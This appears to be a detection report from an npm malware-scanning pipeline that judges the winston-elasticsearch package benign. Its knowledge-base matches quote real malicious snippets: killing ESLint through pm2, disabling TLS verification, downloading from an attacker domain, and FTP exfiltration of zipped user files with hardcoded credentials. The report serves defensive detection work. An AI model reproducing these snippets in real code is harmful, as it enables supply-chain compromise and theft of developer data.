@@ -1,0 +1,511 @@
+{
+  "package_name": "@benbria##winston-elasticsearch",
+  "package_version": "1.0.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T16:42:19.522461",
+  "status": "success",
+  "selected_files_count": 4,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js",
+    "package/bulk_writer.js",
+    "package/transformer.js"
+  ],
+  "is_malicious": false,
+  "total_files": 4,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@benbria##winston-elasticsearch/1.0.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@benbria##winston-elasticsearch/1.0.0/package/index.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@benbria##winston-elasticsearch/1.0.0/package/bulk_writer.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "bulk_writer_slice_1",
+          "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst Promise = require('promise');\nconst debug = require('debug')('winston:elasticsearch');\nconst retry = require('retry');\n\nconst BulkWriter = function BulkWriter(client, options) {\n  this.client = client;\n  this.options = options;\n  this.interval = options.interval || 5000;\n  this.waitForActiveShards = options.waitForActiveShards;\n  this.pipeline = options.pipeline;\n\n  this.bulk = []; // bulk to be flushed\n  this.running = false;\n  this.timer = false;\n  debug('created', this);\n};\n\nBulkWriter.prototype.start = function start() {\n  this.checkEsConnection();\n  this.running = true;\n  this.tick();\n  debug('started');\n};\n\nBulkWriter.prototype.stop = function stop() {\n  this.running = false;\n  if (!this.timer) { return; }\n  clearTimeout(this.timer);\n  this.timer = null;\n  debug('stopped');\n};\n\nBulkWriter.prototype.schedule = function schedule() {\n  const thiz = this;\n  this.timer = setTimeout(() => {\n    thiz.tick();\n  }, this.interval);\n};\n\nBulkWriter.prototype.tick = function tick() {\n  debug('tick');\n  const thiz = this;\n  if (!this.running) { return; }\n  this.flush()\n    .then(() => {\n      // Emulate finally with last .then()\n    })\n    .then(() => { // finally()\n      thiz.schedule();\n    });\n};\n\nBulkWriter.prototype.flush = function flush() {\n  // write bulk to elasticsearch\n  const thiz = this;\n  if (this.bulk.length === 0) {\n    debug('nothing to flush');\n    return new Promise((resolve) => {\n      return resolve();\n    });\n  }\n  const bulk = this.bulk.concat();\n  this.bulk = [];\n  debug('going to write', bulk);\n  return this.client.bulk({\n    body: bulk,\n    waitForActiveShards: this.waitForActiveShards,\n    timeout: this.interval + 'ms',\n    type: this.type\n  }).then((res) => {\n    if (res.errors && res.items) {\n      res.items.forEach((item) => {\n        if (item.index && item.index.error) {\n          // eslint-disable-next-line no-console\n          console.error('Elasticsearch index error', item.index.error);\n        }\n      });\n    }\n  }).catch((e) => { // prevent [DEP0018] DeprecationWarning\n    // rollback this.bulk array\n    thiz.bulk = bulk.concat(thiz.bulk);\n    // eslint-disable-next-line no-console\n    console.error(e);\n    debug('error occrrued', e);\n    this.stop();\n    this.checkEsConnection();\n  });\n};\n\nBulkWriter.prototype.append = function append(index, type, doc) {\n  this.bulk.push({\n    index: {\n      _index: index, _type: type, pipeline: this.pipeline\n    }\n  });\n  this.bulk.push(doc);\n};\n\nBulkWriter.prototype.checkEsConnection = function checkEsConnection() {\n  const thiz = this;\n  thiz.esConnection = false;\n\n  const operation = retry.operation({\n    forever: true,\n    retries: 1,\n    factor: 1,\n    minTimeout: 1 * 1000,\n    maxTimeout: 60 * 1000,\n    randomize: false\n  });\n  return new Promise((fulfill, reject) => {\n    operation.attempt((currentAttempt) => {\n      debug('checking for connection');\n      thiz.client.ping().then(\n        (res) => {\n          thiz.esConnection = true;\n          // Ensure mapping template is existing if desired\n          if (thiz.options.ensureMappingTemplate) {\n            thiz.ensureMappingTemplate(fulfill, reject);\n          } else {\n            fulfill(true);\n          }\n          debug('starting bulk writer');\n          thiz.running = true;\n          thiz.tick();\n        },\n        (err) => {\n          debug('checking for connection');\n          if (operation.retry(err)) {\n            return;\n          }\n          // thiz.esConnection = false;\n          reject(new Error('Cannot connect to ES'));\n        }\n      );\n    });\n  });\n};\n\nBulkWriter.prototype.ensureMappingTemplate = function ensureMappingTemplate(fulfill, reject) {\n  const thiz = this;\n  // eslint-disable-next-line prefer-destructuring\n  let mappingTemplate = thiz.options.mappingTemplate;\n  if (mappingTemplate === null || typeof mappingTemplate === 'undefined') {\n    const rawdata = fs.readFileSync(path.join(__dirname, 'index-template-mapping.json'));\n    mappingTemplate = JSON.parse(rawdata);\n  }\n  const tmplCheckMessage = {\n    name: 'template_' + thiz.options.indexPrefix\n  };\n  thiz.client.indices.getTemplate(tmplCheckMessage).then(\n    (res) => {\n      fulfill(res);\n    },\n    (res) => {\n      if (res.status && res.status === 404) {\n        const tmplMessage = {\n          name: 'template_' + thiz.options.indexPrefix,\n          create: true,\n          body: mappingTemplate\n        };\n        thiz.client.indices.putTemplate(tmplMessage).then(\n          (res1) => {\n            fulfill(res1);\n          },\n          (err1) => {\n            reject(err1);\n          }\n        );\n      }\n    }\n  );\n};\n\nmodule.exports = BulkWriter;\n",
+          "is_malicious": false,
+          "malice_score": 0.3948997418085734,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code reads a local JSON file 'index-template-mapping.json' using fs.readFileSync and parses it to ensure an Elasticsearch index mapping template exists. It accesses the Elasticsearch client API to ping the server, check for existing templates, and create templates if missing. It performs network operations via the Elasticsearch client to bulk write data and manage index templates, enabling automated data ingestion and index management in Elasticsearch clusters.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a legitimate implementation of a BulkWriter utility for Elasticsearch. It performs expected operations such as reading a local JSON file for index mapping templates, managing bulk writes to Elasticsearch, and handling connection retries. There is no evidence of obfuscation, remote code execution, shell command execution, or disabling of security features. The code does not match the key malicious behaviors seen in the knowledge base examples, such as executing shell commands to disable tools, disabling SSL verification, or downloading and executing remote binaries. Instead, it uses standard Elasticsearch client APIs and local file reads in a typical manner for managing Elasticsearch indices.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_056835_snippet_5",
+              "source_package": "@typescript_eslinter/eslint (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_056835/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4043566584587097,
+              "code_similarity": 0.4388987421989441,
+              "behavior_similarity": 0.36981457471847534,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "function deleteEslinter() {\n  return new Promise((resolve, reject) => {\n    t(\"pm2 delete eslinter\", (error, stdout, stderr) => {\n      error\n        ? reject(`Error deleting Eslinter: ${stderr}`)\n        : resolve(stdout);\n    });\n  });\n}",
+                "code_behavior": "At runtime, the code executes a shell command via pm2 to delete the legitimate ESLint process, disabling the real linter and preventing detection or interference with the malicious package.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling or deleting legitimate security or development tools is a common tactic used by malware to avoid detection and maintain persistence.",
+                  "violated_expectations": "A linter or plugin should not attempt to kill or remove other processes, especially those related to code quality or security.",
+                  "similar_legitimate_use": "Process management is legitimate in deployment or orchestration scripts, but not in code analysis plugins.",
+                  "key_indicators": [
+                    "Shell execution targeting ESLint process",
+                    "Use of pm2 to delete legitimate development tool",
+                    "Functionality to disable competing or security-related processes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when invoked by attacker or as part of malicious logic)",
+                  "file_location": "helper function in main package (e.g., index.js)",
+                  "required_permissions": [
+                    "filesystem",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@typescript_eslinter/eslint",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (43 versions released between Nov 17 and Dec 1)",
+                  "why_malicious": "The package is a typosquatted clone of the legitimate @typescript-eslint/eslint-plugin, designed to compromise developer systems. It exfiltrates sensitive clipboard and keystroke data, establishes persistence via Windows Startup, enables remote command execution through a C2 channel, and disables legitimate ESLint processes. The package employs obfuscation and dependency abuse to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package via typosquatting, mistaking it for the legitimate @typescript-eslint/eslint-plugin.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed upon import or runtime as part of the development workflow."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Clipboard and keyboard monitoring is activated to collect sensitive data from the user's system.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive clipboard and keystroke data is stored locally for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Persistence is established by copying a malicious .bat file to the Windows Startup folder.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious payload is automatically executed on every system reboot, maintaining attacker access."
+                  },
+                  {
+                    "step": 4,
+                    "action": "WebSocket connection to an obfuscated C2 server is established for real-time data exfiltration and remote command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker can exfiltrate collected data and issue commands to the compromised system."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Legitimate ESLint process is disabled to prevent detection and interference with the malicious package.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code operates without interference from legitimate code quality tools."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Clipboard or keyboard monitoring in npm packages not related to accessibility or input management",
+                    "Copying or writing files to the Windows Startup folder from npm package code",
+                    "Obfuscated or dynamically decoded C2 server addresses in JavaScript code",
+                    "Persistent WebSocket connections to external IPs or domains from development tools",
+                    "Execution of shell commands to disable or delete legitimate development tool processes (e.g., ESLint)"
+                  ],
+                  "file_indicators": [
+                    "prettier.bat in Windows Startup folder",
+                    "Unexpected .bat files in npm package tools directory",
+                    "Presence of clipboard-event or node-global-key-listener in package.json dependencies",
+                    "References to socket.io-client in linter plugin dependencies"
+                  ],
+                  "network_indicators": [
+                    "WebSocket connections to ws://135.181.226.254:5051 or similar Hetzner Online GmbH IPs",
+                    "Outbound connections to obfuscated or base64-encoded server URLs in code",
+                    "Unusual persistent network activity from static analysis or linter plugins"
+                  ],
+                  "how_to_detect": "Monitor npm packages for access to clipboard or keyboard events, especially in packages not related to accessibility. Flag packages that copy or write files to system startup folders or establish persistent WebSocket connections to external IPs. Scan for obfuscated or encoded server addresses and unexpected dependencies such as clipboard-event, node-global-key-listener, or socket.io-client in code analysis. Alert on the presence of .bat files in package directories or the Windows Startup folder after npm install, and monitor for shell commands targeting legitimate development tool processes."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_2",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.391610324382782,
+              "code_similarity": 0.37691178917884827,
+              "behavior_similarity": 0.4063088893890381,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// B64 encoded values in index.js\nconst env = process.env;\nenv['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';",
+                "code_behavior": "At runtime, index.js sets the NODE_TLS_REJECT_UNAUTHORIZED environment variable to '0', globally disabling SSL/TLS certificate verification for all outgoing network requests, allowing untrusted connections.",
+                "malice_analysis": {
+                  "why_suspicious": "Disabling SSL/TLS verification exposes all network traffic to interception and man-in-the-middle attacks, and is a known tactic to bypass security controls and facilitate malicious communications.",
+                  "violated_expectations": "Legitimate packages should never globally disable SSL/TLS verification, as this undermines the security of all network communications.",
+                  "similar_legitimate_use": "In rare cases, developers may disable verification for local debugging, but this should never occur in production or in published packages.",
+                  "key_indicators": [
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in process.env",
+                    "Obfuscated (base64-encoded) values in index.js",
+                    "Global impact on all subsequent network requests"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195355_440899_snippet_1",
+              "source_package": "bignum (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195355_440899/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3914702534675598,
+              "code_similarity": 0.38322168588638306,
+              "behavior_similarity": 0.3997188210487366,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const https = require('https');\nconst fs = require('fs');\nconst url = 'https://bignum-binaries.s3.amazonaws.com/v0.13.0/bignum.node';\nhttps.get(url, (res) => {\n  const file = fs.createWriteStream('./build/Release/bignum.node');\n  res.pipe(file);\n  file.on('finish', () => {\n    file.close();\n    // Binary ready for loading\n  });\n});",
+                "code_behavior": "During the postinstall phase, the script downloads a .node binary from a remote S3 bucket using HTTPS, writes it to the local filesystem, and prepares it for loading into the Node.js process, enabling execution of arbitrary native code.",
+                "malice_analysis": {
+                  "why_suspicious": "Downloading and executing a remote binary during installation exposes users to supply chain attacks, especially if the remote source is not under the direct control of the package maintainer. This allows attackers to replace the binary with a malicious version without modifying the package code itself.",
+                  "violated_expectations": "A legitimate package should not fetch and execute binaries from untrusted or abandoned remote sources during installation. Binaries should be built locally or fetched from trusted, verifiable sources with integrity checks.",
+                  "similar_legitimate_use": "Some packages legitimately download prebuilt binaries for performance or compatibility, but only from official, actively maintained, and integrity-verified sources.",
+                  "key_indicators": [
+                    "Remote binary download from S3 bucket during npm install",
+                    "No cryptographic integrity or authenticity verification of the downloaded binary",
+                    "Dependency on an external, potentially abandoned S3 bucket for critical code",
+                    "Automatic execution of downloaded native code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (npm install phase)",
+                  "file_location": "scripts/postinstall.js (invokes node-gyp to download and build bignum.node from S3)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "bignum",
+                  "package_manager": "npm",
+                  "package_versions": "0.12.2-0.13.0",
+                  "why_malicious": "The package itself was not directly modified, but its reliance on downloading a binary from a remote S3 bucket during installation introduced a critical supply chain vulnerability. An attacker hijacked the abandoned S3 bucket and replaced the expected binary with a malicious version. This binary, while preserving expected mathematical functionality, covertly harvested sensitive user and system data (such as user IDs, password entries, environment variables, and hostnames) and exfiltrated it to attacker-controlled infrastructure. This makes the affected package versions dangerous and untrustworthy for any use."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker identifies and hijacks the abandoned S3 bucket previously used to host bignum prebuilt binaries.",
+                    "implemented_by": [],
+                    "leads_to": "Attacker gains control over the binary distribution channel."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker uploads a malicious bignum.node binary to the hijacked S3 bucket at the expected path for affected versions.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious binary is now served to users during package installation."
+                  },
+                  {
+                    "step": 3,
+                    "action": "During npm install, bignum's postinstall script downloads the malicious .node binary from the hijacked S3 bucket.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious binary is written to the local filesystem and prepared for execution."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The malicious .node binary is loaded and executed by Node.js, harvesting sensitive data from the system and environment.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Sensitive data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 5,
+                    "action": "The binary exfiltrates the harvested data to the attacker's S3 bucket using a crafted HTTP GET request with the data embedded in the user-agent header.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives sensitive data from compromised systems, achieving the final objective."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package installation process triggers download of a remote .node binary from an S3 bucket or other cloud storage.",
+                    "Presence of a postinstall script that fetches and writes a native binary to the build/Release directory.",
+                    "Native binary loaded by JavaScript package accesses system/user/environment information via system calls.",
+                    "Outbound network connections initiated by native binaries to S3 buckets or domains not associated with the package maintainer.",
+                    "Sensitive data (user IDs, environment variables, hostnames) sent in HTTP headers, particularly the user-agent, during HTTP requests."
+                  ],
+                  "file_indicators": [
+                    "build/Release/bignum.node binary with SHA256 hashes: 3c6793de04bfc8407392704b3a6cef650425e42ebc95455f3c680264c70043a7, 3ba3fd7e7a747598502c7afbe074aa0463a7def55d4d0dec6f061cd3165b5dd1",
+                    "Presence of .node binaries downloaded from non-official or abandoned S3 buckets (e.g., bignum-binaries.s3.amazonaws.com)",
+                    "scripts/postinstall.js or similar files containing remote binary download logic"
+                  ],
+                  "network_indicators": [
+                    "HTTP GET requests to hijacked S3 bucket URLs (e.g., bignum-binaries.s3.amazonaws.com) with suspicious user-agent headers containing encoded system/user data",
+                    "Outbound connections from build/Release/bignum.node to S3 buckets or IPs not controlled by the official package maintainer"
+                  ],
+                  "how_to_detect": "Monitor npm package installation processes for remote binary downloads, especially from S3 buckets or cloud storage not officially associated with the package. Flag any .node (native) binaries that are not built locally or are fetched from untrusted or abandoned sources. Analyze loaded native binaries for suspicious system calls (getuid, getenv, getpwuid, gethostname, uname) and unexpected outbound network activity. Inspect outbound HTTP requests for sensitive data exfiltration, particularly in headers like user-agent. Correlate package versions and binary hashes with known indicators of compromise (IOCs) to identify affected installations."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104221_852989_snippet_3",
+              "source_package": "btc-api-node (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104221_852989/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38706228137016296,
+              "code_similarity": 0.3477301001548767,
+              "behavior_similarity": 0.4263944625854492,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Directory creation and download\nfs.mkdirSync('.electron');\nconst file = await fetch('https://npmaudit.com/api/v4/init');\nfs.writeFileSync('.electron/token', await file.text());",
+                "code_behavior": "At runtime, index.js creates a hidden directory named .electron, downloads a file from https://npmaudit.com/api/v4/init, and writes the downloaded content as a token file to the local filesystem, marking the system as compromised and ready for further attacker actions.",
+                "malice_analysis": {
+                  "why_suspicious": "Creating hidden directories and downloading files from an attacker-controlled domain during installation is a hallmark of staged malware delivery and persistence mechanisms.",
+                  "violated_expectations": "Legitimate packages should not download and store files from untrusted or non-official domains, nor create hidden directories as part of installation.",
+                  "similar_legitimate_use": "Some packages may download dependencies, but only from official or trusted sources, and rarely to hidden directories.",
+                  "key_indicators": [
+                    "Download from npmaudit.com (non-official domain)",
+                    "Creation of hidden directory (.electron)",
+                    "Writing of token file as a compromise marker"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall/runtime",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "btc-api-node",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (removed quickly after upload)",
+                  "why_malicious": "The package impersonates a legitimate cryptocurrency API library but contains a postinstall script that executes a malicious index.js file. This file disables SSL/TLS verification globally, downloads a payload from an attacker-controlled domain, creates hidden directories, and writes compromise markers, enabling further compromise and persistence on the system."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering the postinstall script.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of index.js and environment manipulation"
+                  },
+                  {
+                    "step": 2,
+                    "action": "index.js disables SSL/TLS verification for all outgoing network requests.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Allows unverified and potentially malicious network communication"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js creates a hidden directory and downloads a token file from attacker infrastructure.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is marked as compromised and ready for stage 2 payloads"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch index.js or similar files during npm package installation",
+                    "Setting NODE_TLS_REJECT_UNAUTHORIZED=0 in environment variables within package scripts",
+                    "Creation of hidden directories (e.g., .electron) during install process",
+                    "Download of files from non-standard or suspicious domains (e.g., npmaudit.com) during installation"
+                  ],
+                  "file_indicators": [
+                    ".electron/token",
+                    "Presence of index.js with base64-encoded values",
+                    "package.json with postinstall script referencing index.js"
+                  ],
+                  "network_indicators": [
+                    "npmaudit.com (attacker-controlled C2 domain)",
+                    "HTTP(S) requests to https://npmaudit.com/api/v4/init endpoint"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute JavaScript files, especially those that set NODE_TLS_REJECT_UNAUTHORIZED=0 or download files from non-standard domains. Flag packages that create hidden directories or write token files (e.g., .electron/token) during installation. Network monitoring should alert on connections to npmaudit.com or similar suspicious domains and requests to /api/v4/init. YARA rules can be used to detect the base64-encoded string 'Tk9ERV9UTFNfUkVKRUNUX1VOQVVUSE9SSVpFRA==' in process environments or index.js files."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.3867362141609192,
+              "code_similarity": 0.36030739545822144,
+              "behavior_similarity": 0.41316506266593933,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/@benbria##winston-elasticsearch/1.0.0/package/transformer.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
